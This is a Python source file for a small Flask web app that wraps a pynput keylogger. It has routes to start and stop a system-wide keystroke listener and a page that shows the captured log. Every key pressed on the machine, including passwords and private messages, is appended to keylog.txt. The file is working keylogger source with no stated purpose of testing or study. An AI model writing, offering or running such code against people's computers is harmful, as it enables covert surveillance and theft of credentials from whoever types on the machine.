from flask import Flask, render_template, request, redirect, url_for
from threading import Thread
from pynput.keyboard import Key, Listener

app = Flask(__name__)

log = ""  # Variable to store the logged keystrokes
listener = None  # Global variable for the listener thread

# Function to append pressed key to log
def on_press(key):
    global log
    try:
        log = str(key.char)  # Record the character pressed
    except AttributeError:
        if key == Key.space:
            log = " "  # Record spaces
        else:
            log = " " + str(key) + " "  # Record special keys

    write_log(log)  # Write the log to file after each keystroke

# Function to write log to file
def write_log(log):
    with open("keylog.txt", "a") as f:
        f.write(log + "\n")

# Function to read log from file
def read_log():
    try:
        with open("keylog.txt", "r") as f:
            return f.read()
    except FileNotFoundError:
        return ""

# Function to start keylogger
def start_keylogger():
    global listener
    if listener is None:
        listener = Listener(on_press=on_press)
        listener.start()

# Function to stop keylogger
def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        listener = None

@app.route('/')
def index():
    logged_text = read_log()
    return render_template('index.html', logged_text=logged_text)

@app.route('/start', methods=['POST'])
def start():
    start_keylogger()
    return redirect(url_for('index'))

@app.route('/stop', methods=['POST'])
def stop():
    stop_keylogger()
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
